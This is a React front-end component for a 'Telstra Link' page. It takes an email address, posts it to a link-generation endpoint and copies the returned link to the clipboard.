import axios from 'axios'
import { hostURL } from '../helpers/data'
import { useState } from 'react'
import { useClipboard } from '../hooks/useClipboard'

const Body = () => {
  const [email, setEmail] = useState('')
  const [error, setError] = useState(false)

  const copyToClipboard = useClipboard()

  const handleClickToCopy = (textToCopy) => {
    copyToClipboard(textToCopy)
    alert('Link Copied!')
  }

  const handleClick = () => {
    setError(false)
    if (!email) {
      setError(true)
      return
    }
    axios
      .post(`${hostURL}gen-link`, { email })
      .then((resp) => {
        const data = resp.data
        console.log(data)
        if (data['link']) {
          handleClickToCopy(data['link'])
        }
      })
      .catch((e) => console.log(e))
  }
  return (
    <div className='w-screen h-screen flex items-center justify-center'>
      <section className='w-[23rem] border-2 px-3 py-2 rounded-md'>
        <header className='text-center font-semibold text-2xl my-2'>
          <h2>Telstra Link</h2>
          Enter your email
        </header>
        <div className='flex flex-col justify-center gap-3'>
          <input
            type='email'
            placeholder='doe@john.com'
            className='w-full border rounded-sm outline-none px-3 py-2'
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          {error && (
            <p className='text-red-700 font-medium'>Enter your email</p>
          )}
          <button className='bg-blue-700 text-white py-3' onClick={handleClick}>
            Get Link
          </button>
        </div>
      </section>
    </div>
  )
}

export default Body
